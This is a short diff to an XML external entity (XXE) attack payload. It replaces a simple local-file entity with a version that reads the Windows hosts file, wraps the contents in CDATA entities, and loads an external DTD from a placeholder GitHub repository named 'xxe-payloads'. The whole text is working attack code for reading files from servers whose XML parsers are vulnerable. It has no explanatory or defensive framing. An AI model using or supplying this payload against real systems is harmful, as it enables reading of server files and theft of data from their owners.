@@ -1,2 +1,5 @@
-<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
-<!ENTITY exfil "%data;">
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/YOUR_USERNAME/xxe-payloads/main/dtd.xml">
+%dtd;
